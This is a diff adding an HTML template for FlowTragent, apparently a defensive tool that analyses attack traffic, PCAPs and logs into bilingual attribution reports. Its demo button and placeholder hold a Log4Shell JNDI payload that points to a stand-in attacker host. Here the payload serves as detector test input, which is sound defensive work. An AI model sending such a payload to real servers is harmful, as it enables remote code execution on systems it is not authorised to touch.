@@ -1,0 +1,121 @@
+{% extends "base.html" %}
+{% block title %}FlowTragent{% endblock %}
+{% block body %}
+<header>
+  <div>
+    <h1>FlowTragent</h1>
+    <p class="subtle">攻击流量输入 -> 多源证据融合 -> 中英文溯源报告</p>
+  </div>
+  <div class="actions">
+    <a class="button secondary" href="{{ url_for('health') }}">健康检查</a>
+    <a class="button secondary" href="{{ url_for('metrics') }}">Metrics</a>
+    <a class="button secondary" href="{{ url_for('alerts') }}">实时告警</a>
+    <a class="button secondary" href="{{ url_for('index') }}">刷新</a>
+  </div>
+</header>
+
+<section class="quickstart">
+  <div>
+    <h2>快速开始</h2>
+    <p class="subtle">用 demo payload 验证检索、攻击链、证据分级和报告生成。</p>
+  </div>
+  <div class="actions">
+    <button type="button" onclick="document.querySelector('textarea[name=payload]').value='GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\\nHost: victim';">填充 Log4Shell Demo</button>
+    <button type="button" onclick="navigator.clipboard && navigator.clipboard.writeText('python tests/make_demo_pcap.py && python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index');">复制 PCAP Demo 命令</button>
+  </div>
+</section>
+
+<section>
+  <h2>运行状态</h2>
+  <div class="meta">
+    <div><div class="label">NOVA Index</div><strong>{{ summary.nova_status }}</strong></div>
+    <div><div class="label">Reports</div><strong>{{ summary.report_count }}</strong></div>
+    <div><div class="label">Live Queue</div><strong>{{ summary.live_queue }}</strong></div>
+    <div><div class="label">Alerts / High</div><strong>{{ summary.alert_count }} / {{ summary.high_alerts }}</strong></div>
+  </div>
+</section>
+
+<div class="grid">
+  <section>
+    <h2>Payload 分析</h2>
+    <form method="post" action="/analyze-payload">
+      <textarea name="payload" placeholder="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim"></textarea>
+      <label>Token <input type="password" name="flowtragent_token" autocomplete="current-password"></label>
+      <p class="checks">
+        <label><input type="checkbox" name="demo_index" checked> demo index</label>
+        <label><input type="checkbox" name="enable_rag" checked> RAG</label>
+        <label><input type="checkbox" name="enable_ollama"> Ollama</label>
+      </p>
+      <button type="submit">生成报告</button>
+    </form>
+  </section>
+
+  <section>
+    <h2>PCAP + 日志分析</h2>
+    <form method="post" action="/analyze-pcap" enctype="multipart/form-data">
+      <div class="file-grid">
+        <label>PCAP <input type="file" name="pcap" accept=".pcap,.cap,.pcapng"></label>
+        <label>Access Log <input type="file" name="access_log" accept=".log,.txt,.jsonl,.csv"></label>
+        <label>DNS Log <input type="file" name="dns_log" accept=".log,.txt,.jsonl,.csv"></label>
+        <label>Endpoint Log <input type="file" name="endpoint_log" accept=".log,.txt,.jsonl,.csv"></label>
+        <label>Application Log <input type="file" name="app_log" accept=".log,.txt,.jsonl,.csv"></label>
+      </div>
+      <label>Token <input type="password" name="flowtragent_token" autocomplete="current-password"></label>
+      <p class="checks">
+        <label><input type="checkbox" name="demo_index" checked> demo index</label>
+        <label><input type="checkbox" name="enable_rag" checked> RAG</label>
+        <label><input type="checkbox" name="enable_ollama"> Ollama</label>
+      </p>
+      <button type="submit">上传并分析</button>
+    </form>
+  </section>
+</div>
+
+{% if report %}
+<section class="result">
+  <div>
+    <strong>报告已生成</strong>
+    <p class="subtle">{{ report.name }}</p>
+  </div>
+  <div class="actions">
+    <a class="button" href="{{ url_for('view_report', filename=report.name, lang='zh') }}">中文查看</a>
+    <a class="button secondary" href="{{ url_for('view_report', filename=report.name, lang='en') }}">English</a>
+  </div>
+</section>
+{% endif %}
+
+<section>
+  <h2>最近报告</h2>
+  <form class="toolbar" method="get" action="/">
+    <input name="q" value="{{ q or '' }}" placeholder="按文件名搜索报告">
+    <button type="submit">搜索</button>
+    <a class="button secondary" href="{{ url_for('export_reports_zip') }}">导出 ZIP</a>
+  </form>
+  {% if reports %}
+  <ul class="report-list">
+    {% for item in reports %}
+    <li>
+      <span class="report-name">{{ item.name }}</span>
+      <span class="actions">
+        <a class="button" href="{{ url_for('view_report', filename=item.name, lang='zh') }}">中文</a>
+        <a class="button secondary" href="{{ url_for('view_report', filename=item.name, lang='en') }}">English</a>
+        <a class="button secondary" href="{{ url_for('download_report', filename=item.name) }}">MD</a>
+        {% if item.zh_name %}
+        <a class="button secondary" href="{{ url_for('download_report', filename=item.zh_name) }}">中文 MD</a>
+        {% endif %}
+        {% if item.json_name %}
+        <a class="button secondary" href="{{ url_for('download_report', filename=item.json_name) }}">JSON</a>
+        {% endif %}
+        <form method="post" action="{{ url_for('delete_report', filename=item.name) }}" style="display:inline;" onsubmit="return confirm('确认删除该报告的 Markdown/JSON/DOT/PNG/SVG 文件？');">
+          <input type="password" name="flowtragent_token" placeholder="Token" autocomplete="current-password">
+          <button class="danger" type="submit">删除</button>
+        </form>
+      </span>
+    </li>
+    {% endfor %}
+  </ul>
+  {% else %}
+  <p class="subtle">暂无报告。</p>
+  {% endif %}
+</section>
+{% endblock %}
